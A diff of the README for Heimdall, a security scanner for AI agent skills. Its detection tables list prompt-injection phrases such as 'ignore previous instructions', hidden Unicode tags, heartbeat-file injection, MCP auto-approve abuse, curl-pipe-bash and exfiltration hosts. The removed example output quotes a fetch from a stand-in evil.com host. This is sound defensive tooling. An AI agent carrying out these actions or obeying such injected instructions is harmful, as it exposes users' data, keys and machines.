@@ -1,23 +1,72 @@
-# Heimdall 👁️
+# Heimdall 🛡️
 
-**The Watchman of Asgard - Security Scanner for AI Agent Skills**
+The Watchman of Asgard - Security Scanner for AI Agent Skills
 
 Heimdall scans OpenClaw/Clawdbot skills for malicious patterns before installation. Context-aware scanning reduces false positives by ~85%.
 
-## v3.0 Features (NEW)
+## v4.0 Features (NEW)
 
-From **HiveFence Scout**, **PromptArmor**, and **Simon Willison**:
+### AI-Powered Analysis 🤖
 
-| Category | Description |
-|----------|-------------|
-| 🌐 Remote Fetch | Detects `curl skill.md` from internet |
-| 💓 Heartbeat Injection | Catches HEARTBEAT.md modifications |
-| 🔧 MCP Tool Abuse | Flags `no_human_approval`, `auto_approve` |
-| 🏷️ Unicode Tags | Hidden U+E0001-U+E007F characters |
-| ⚡ Auto-Approve | `always allow`, `curl \| bash` patterns |
-| 💰 Crypto Wallets | BTC/ETH address extraction |
-| 🎭 Impersonation | "ignore previous instructions" |
-| 📋 Pre-fill Exfil | Google Forms data exfiltration |
+```bash
+skill-scan --analyze /path/to/skill
+```
+
+Generates a **narrative security report** that explains:
+- WHY each finding is dangerous
+- Attack scenarios and impact
+- What you're agreeing to by installing
+- Actionable recommendations
+
+**Example output:**
+```
+============================================================
+🔍 HEIMDALL SECURITY ANALYSIS 
+============================================================
+
+📁 Skill: suspicious-skill
+⚡ Verdict: 🚨 HIGH RISK - Requires Significant Trust
+
+## Summary
+This skill installs code from an external company that can 
+self-modify and sends telemetry to third-party servers.
+
+## Key Risks
+
+### 1. Data Exfiltration
+OpenTelemetry sends execution traces to Signoz/Uptrace. 
+YOUR agent's behavior → THEIR servers. 🚨
+
+### 2. Supply Chain Attack Surface
+- Git clones from: external repos
+- Frequency: Install + during "self-evolution" cycles
+
+## What You're Agreeing To
+1. Installing their code
+2. Letting it modify itself
+3. Sending telemetry to them
+4. Trusting their GitHub repo won't go malicious
+
+## Recommendation
+🔴 Don't install on any machine with real data/keys.
+✅ Safe only on: air-gapped VM, no secrets, no API keys
+============================================================
+```
+
+### v3.0 Pattern Detection
+
+| Category | Source | Detects |
+|----------|--------|---------|
+| 🌐 Remote Fetch | Willison | curl skill.md from internet |
+| 💓 Heartbeat Injection | Willison | HEARTBEAT.md modifications |
+| 🔧 MCP Tool Abuse | PromptArmor | no_human_approval, auto_approve |
+| 🏷️ Unicode Tags | Willison | Hidden U+E0001-U+E007F characters |
+| ⚡ Auto-Approve | LLMSecurity | always allow, curl \| bash patterns |
+| 💰 Crypto Wallets | opensourcemalware | BTC/ETH address extraction |
+| 🎭 Impersonation | HiveFence | "ignore previous instructions" |
+| 📋 Pre-fill Exfil | PromptArmor | Google Forms data exfiltration |
+| 📦 Supply Chain | NEW | External git repos, npm installs |
+| 📡 Telemetry | NEW | OpenTelemetry, Signoz, Uptrace |
 
 ## Installation
 
@@ -28,33 +77,53 @@ chmod +x skill-scan.py
 ln -s $(pwd)/skill-scan.py ~/.local/bin/skill-scan
 ```
 
+For AI analysis, set your OpenRouter API key:
+```bash
+export OPENROUTER_API_KEY="sk-or-..."
+# Or save to ~/clawd/secrets/openrouter.key
+```
+
 ## Usage
 
 ```bash
-skill-scan <path-to-skill>
-skill-scan --json <path>           # JSON output
-skill-scan -v <path>               # Verbose
-skill-scan --strict <path>         # Ignore context
-skill-scan --show-suppressed <path> # Show suppressed
+# Basic scan
+skill-scan /path/to/skill
+
+# AI-powered narrative analysis (NEW in v4.0)
+skill-scan --analyze /path/to/skill
+
+# JSON output
+skill-scan --json /path/to/skill
+
+# Verbose (show all findings)
+skill-scan -v /path/to/skill
+
+# Strict mode (ignore context, flag everything)
+skill-scan --strict /path/to/skill
+
+# Show suppressed findings
+skill-scan --show-suppressed /path/to/skill
 ```
 
 ## Detection Categories (100+ patterns)
 
 | Category | Severity | Examples |
 |----------|----------|----------|
-| `credential_access` | CRITICAL | .env, API keys, tokens |
-| `network_exfil` | CRITICAL | webhook.site, ngrok.io |
-| `shell_exec` | CRITICAL | subprocess, eval, exec |
-| `remote_fetch` | CRITICAL | curl skill.md from web |
-| `heartbeat_injection` | CRITICAL | Modifying HEARTBEAT.md |
-| `mcp_abuse` | CRITICAL | no_human_approval |
-| `unicode_injection` | CRITICAL | Hidden tag characters |
-| `auto_approve` | CRITICAL | curl \| bash |
-| `crypto_wallet` | HIGH | BTC/ETH addresses |
-| `impersonation` | HIGH | System prompt injection |
-| `prefill_exfil` | HIGH | Google Forms pre-fill |
-| `privilege` | HIGH | sudo -S, chmod 777 |
-| `persistence` | HIGH | crontab, bashrc |
+| credential_access | CRITICAL | .env, API keys, tokens |
+| network_exfil | CRITICAL | webhook.site, ngrok.io |
+| shell_exec | CRITICAL | subprocess, eval, exec |
+| remote_fetch | CRITICAL | curl skill.md from web |
+| heartbeat_injection | CRITICAL | Modifying HEARTBEAT.md |
+| mcp_abuse | CRITICAL | no_human_approval |
+| unicode_injection | CRITICAL | Hidden tag characters |
+| auto_approve | CRITICAL | curl \| bash |
+| supply_chain | HIGH | External git repos |
+| telemetry | HIGH | OpenTelemetry backends |
+| crypto_wallet | HIGH | BTC/ETH addresses |
+| impersonation | HIGH | System prompt injection |
+| prefill_exfil | HIGH | Google Forms pre-fill |
+| privilege | HIGH | sudo -S, chmod 777 |
+| persistence | HIGH | crontab, bashrc |
 
 ## Context-Aware Scanning
 
@@ -62,34 +131,27 @@ Heimdall understands context to reduce false positives:
 
 | Context | Adjustment | Example |
 |---------|------------|---------|
-| `CODE` | Full severity | Executable scripts |
-| `CONFIG` | -1 level | YAML/JSON configs |
-| `DOCS` | -3 levels | README, CHANGELOG |
-| `STRING` | -3 levels | Pattern definitions |
+| CODE | Full severity | Executable scripts |
+| CONFIG | -1 level | YAML/JSON configs |
+| DOCS | -3 levels | README, CHANGELOG |
+| STRING | -3 levels | Pattern definitions |
 
 Security tools (Prompt Guard, etc.) are auto-detected and their pattern examples are suppressed.
 
-## Example Output
+## Example Workflow
 
-```
-============================================================
-🔍 SKILL SECURITY SCAN REPORT v3.0
-============================================================
-📁 Path: /path/to/suspicious-skill
-📄 Files scanned: 5
-🔢 Active issues: 14
-🔇 Suppressed (context-aware): 2
-⚡ Max severity: CRITICAL
-📋 Action: 🚨 CRITICAL - BLOCKED - Likely malicious
-============================================================
+```bash
+# 1. Download skill without installing
+git clone https://github.com/some/skill /tmp/test-skill
 
-🚨 CRITICAL (10 issues):
-  [remote_fetch]
-    • install.sh:3  - Fetching skill from internet
-      Match: curl https://evil.com/skill.md > ~/.moltbot/skills/
-  [heartbeat_injection]
-    • install.sh:4  - Appending to heartbeat file
-      Match: >> ~/.openclaw/HEARTBEAT.md
+# 2. Scan with AI analysis
+skill-scan --analyze /tmp/test-skill
+
+# 3. If clean, install
+cp -r /tmp/test-skill ~/clawd/skills/
+
+# 4. If suspicious, delete
+rm -rf /tmp/test-skill
 ```
 
 ## Why "Heimdall"?
@@ -110,6 +172,7 @@ MIT
 ## Credits
 
 Built by the Enterprise Crew 🚀
+
 - Ada 🔮 (Brain + BD/Sales)
 - Spock 🖖 (Research & Ops)
 - Scotty 🔧 (Builder)
